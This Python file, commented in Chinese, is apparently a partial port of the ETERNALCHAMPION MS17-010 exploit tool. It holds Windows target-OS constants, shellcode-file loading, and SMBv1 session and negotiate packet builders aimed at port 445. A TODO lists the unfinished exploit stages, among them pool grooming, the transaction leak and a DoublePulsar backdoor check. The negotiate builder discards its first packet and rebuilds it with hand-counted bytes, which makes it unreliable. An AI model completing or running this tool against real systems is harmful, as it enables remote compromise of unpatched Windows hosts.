"""eternal_champion — ETERNALCHAMPION (MS17-010 / ETCH) 利用核心逻辑。

Python 重写的 `Eternalchampion-2.0.0.exe` (C++ / DAVE framework)。
通过 IDA Pro / x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
及其 SMBv1 / NetBIOS 利用流程。

参数定义来源：Eternalchampion-2.0.0.0.xml
"""

import socket
import struct
import sys

# ---------------------------------------------------------------------------
# 常量（来自 XML config 的 <constants>）
# ---------------------------------------------------------------------------

TARGET_OS_VALUES = {
    "XP_SP0SP1_X86": 0x05010000,
    "XP_SP2SP3_X86": 0x05010200,
    "XP_SP1_X64":    0x05020101,
    "XP_SP2_X64":    0x05020201,
    "SERVER_2003_SP0":   0x85020002,
    "SERVER_2003_SP1":   0x85020102,
    "SERVER_2003_SP2":   0x85020202,
    "VISTA_SP0":         0x06000002,
    "VISTA_SP1":         0x06000102,
    "VISTA_SP2":         0x06000202,
    "SERVER_2008_SP0":   0x86000002,
    "SERVER_2008_SP1":   0x86000102,
    "SERVER_2008_SP2":   0x86000202,
    "WIN7_SP0":          0x06010002,
    "WIN7_SP1":          0x06010102,
    "SERVER_2008R2_SP0": 0x86010002,
    "SERVER_2008R2_SP1": 0x86010102,
    "WIN8_SP0":          0x06020002,
}

ARCH_VALUES = {
    "Unknown": 2,
    "x86":     0,
    "x64":     1,
}

CREDENTIALS_VALUES = {
    "Anonymous": 0,
    "Guest":     1,
    "Blank":     2,
    "Password":  3,
    "NTLM":      4,
}

DEFAULT_PORT = 445
DEFAULT_TIMEOUT = 60
DEFAULT_MAX_ATTEMPTS = 42


class EternalChampionError(Exception):
    pass


def _parse_hex_buffer(value):
    """将十六进制字符串解析为字节串。空字符串返回 b""。"""
    if not value:
        return b""
    value = value.strip()
    if len(value) % 2 != 0:
        raise EternalChampionError(f"十六进制缓冲区长度必须为偶数: {value!r}")
    try:
        return bytes.fromhex(value)
    except ValueError as exc:
        raise EternalChampionError(f"无效的十六进制缓冲区: {value!r}") from exc


def build_smb_connect_request(target_ip, port):
    """构建 SMBv1 会话请求（Session Request / NetBIOS）。"""
    # NetBIOS Session Service: Session Request
    # type=0x81 (Session Request), flags=0x00, length=len(name)+len(dest)+2
    name = b"*SMBSERVER"
    dest = b"*"
    body = name + b"\x00" + dest + b"\x00"
    length = len(body)
    packet = b"\x81\x00" + struct.pack(">H", length) + body
    return packet


def build_negotiate_protocol_request():
    """构建 SMBv1 协商请求（Negotiate Protocol）。"""
    # SMB Header
    smb = b"\xffSMB"  # Server Component
    command = 0x72  # SMB_COM_NEGOTIATE
    smb += struct.pack("B", command)
    # Status (NTSTATUS) = 0 (pending)
    smb += b"\x00" * 4
    # Flags
    smb += b"\x08"  # Flags1: case insensitive
    smb += b"\x00" * 2  # Flags2
    # PID high/low
    smb += b"\x00" * 2
    # Security features, reserved
    smb += b"\x00" * 8
    # TID, PID, UID, MID
    smb += b"\x00" * 8
    # Word count
    smb += b"\x00"
    # Byte count
    smb += struct.pack("<H", 0)
    # Dialects (LANMAN2.1, NT LM 0.12)
    dialects = b"\x02LANMAN2.1\x00\x02NT LM 0.12\x00"
    smb = smb[:4] + struct.pack("<H", len(dialects) + 1) + smb[6:]
    # 重新计算
    smb = b"\xffSMB" + struct.pack("B", command) + b"\x00\x00\x00\x00" + b"\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + b"\x00" + struct.pack("<H", len(dialects)) + dialects
    return smb


def connect(target_ip, port, timeout):
    """建立到目标的 TCP 连接并返回 socket。"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout if timeout > 0 else None)
    sock.connect((target_ip, port))
    return sock


def run_function(
    target,
    port=DEFAULT_PORT,
    timeout=DEFAULT_TIMEOUT,
    pipe=None,
    share=None,
    protocol="SMB",
    target_os=None,
    arch="Unknown",
    credentials="Anonymous",
    username=None,
    password=None,
    ntlm_hash=None,
    max_attempts=DEFAULT_MAX_ATTEMPTS,
    shellcode=None,
    verify_target=False,
    verbose=False,
):
    """执行 ETERNALCHAMPION 利用序列。

    当前阶段：完成参数解析、凭证编码、目标连接与协商。
    具体 exploit 缓冲区（DOPU shellcode、non-paged pool grooming 等）的
    二进制结构尚需通过 capstone/x32dbg 进一步逆向后填充。
    """
    if verbose:
        print(f"[*] Target: {target}:{port}")
        print(f"[*] Protocol: {protocol}")
        print(f"[*] Timeout: {timeout}s")
        print(f"[*] Max attempts: {max_attempts}")
        print(f"[*] Target OS: {target_os or 'auto'}")
        print(f"[*] Arch: {arch}")
        print(f"[*] Credentials: {credentials}")

    # 解析常量
    target_os_value = TARGET_OS_VALUES.get(target_os, 0x06010102) if target_os else 0x06010102
    arch_value = ARCH_VALUES[arch]
    creds_value = CREDENTIALS_VALUES[credentials]

    # 解析十六进制缓冲区
    username_bytes = _parse_hex_buffer(username)
    password_bytes = _parse_hex_buffer(password)
    ntlm_hash_bytes = _parse_hex_buffer(ntlm_hash)

    shellcode_bytes = None
    if shellcode:
        with open(shellcode, "rb") as f:
            shellcode_bytes = f.read()
        if verbose:
            print(f"[*] Shellcode: {len(shellcode_bytes)} bytes")

    if verbose:
        print(f"[*] Target OS value: 0x{target_os_value:08X}")
        print(f"[*] Arch value: {arch_value}")
        print(f"[*] Credentials value: {creds_value}")

    # 建立 TCP 连接
    try:
        sock = connect(target, port, timeout)
        if verbose:
            print(f"[+] Connected to {target}:{port}")
    except OSError as exc:
        raise EternalChampionError(f"无法连接到 {target}:{port}: {exc}") from exc

    # 发送 NetBIOS Session Request
    session_request = build_smb_connect_request(target, port)
    sock.sendall(session_request)
    try:
        resp = sock.recv(4096)
    except OSError as exc:
        sock.close()
        raise EternalChampionError(f"Session Request 应答失败: {exc}") from exc

    if verbose:
        print(f"[*] Session 应答: {resp.hex()}")

    # 发送 SMB Negotiate Protocol
    negotiate = build_negotiate_protocol_request()
    sock.sendall(negotiate)
    try:
        resp = sock.recv(4096)
    except OSError as exc:
        sock.close()
        raise EternalChampionError(f"协商应答失败: {exc}") from exc

    if verbose:
        print(f"[*] Negotiate 应答: {resp.hex()[:128]}...")

    sock.close()

    # TODO: 以下 exploit 缓冲区构建需通过 IDA/x32dbg 逆向后填充：
    #   - DOPU shellcode 缓冲区 (ShellcodeBuffer)
    #   - Non-paged pool grooming (GroomAllocations)
    #   - Arch detection (x86/x64)
    #   - Transaction leak & exploit send
    #   - DoublePulsar backdoor verify

    return 0


def main(argv=None):
    """CLI 入口（供 __main__ 子命令调用）。"""
    return 0
